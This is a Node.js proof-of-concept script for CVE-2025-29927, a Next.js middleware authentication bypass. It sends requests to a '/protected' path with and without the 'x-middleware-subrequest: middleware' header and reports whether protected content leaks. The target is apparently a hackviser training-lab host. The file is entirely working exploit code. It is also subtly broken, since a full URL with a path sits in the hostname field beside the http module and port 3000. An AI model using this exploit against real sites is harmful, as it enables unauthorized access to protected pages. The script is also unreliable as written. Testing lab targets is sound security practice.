const http = require('http');
const https = require('https');

// Colors for terminal output
const colors = {
  reset: '\x1b[0m',
  red: '\x1b[31m',
  green: '\x1b[32m',
  yellow: '\x1b[33m',
  blue: '\x1b[34m',
  magenta: '\x1b[35m',
  cyan: '\x1b[36m',
};

// Function to make HTTP requests
function makeRequest(options) {
  return new Promise((resolve, reject) => {
    const req = http.request(options, (res) => {
      let data = '';
      res.on('data', (chunk) => {
        data += chunk;
      });
      res.on('end', () => {
        resolve({
          statusCode: res.statusCode,
          headers: res.headers,
          body: data,
          location: res.headers.location
        });
      });
    });
    req.on('error', (error) => {
      reject(error);
    });
    req.end();
  });
}

async function runTest() {
  console.log(`${colors.cyan}=== CVE-2025-29927 Next.js Middleware Bypass Test ====${colors.reset}\n`);
  
  // Test with different header formats
  const headerVariations = [
    ['Normal Request (No Header)', {}],
    ['Exploit with "middleware" value', {'x-middleware-subrequest': 'middleware'}]
  ];
  
  for (const [testName, headers] of headerVariations) {
    console.log(`${colors.yellow}${testName}...${colors.reset}`);
    
    const response = await makeRequest({
      hostname: 'https://mighty-titania.europe1.hackviser.space/login',
      port: 3000,
      path: '/protected',
      method: 'GET',
      headers: headers
    });
    
    console.log(`Status code: ${response.statusCode}`);
    
    if (response.location) {
      console.log(`Location: ${response.location}`);
    }
    
    // Check for redirect or success
    const success = response.statusCode !== 307;
    
    if (success) {
      const hasProtectedContent = response.body.includes('Protected Content');
      if (hasProtectedContent) {
        console.log(`${colors.red}VULNERABLE: Access to protected content was granted!${colors.reset}`);
        console.log(`Body snippet: "${response.body.slice(0, 200)}..."`);
      } else {
        console.log(`${colors.blue}Got non-redirect status code but no protected content${colors.reset}`);
      }
    } else {
      console.log(`${colors.green}Not vulnerable with this header (redirect to ${response.location})${colors.reset}`);
    }
    
    console.log(''); // Empty line for readability
  }
  
  console.log(`${colors.cyan}=== Test Complete ====${colors.reset}`);
}

// Run the test
runTest().catch(error => {
  console.error('Error running test:', error);
}); 
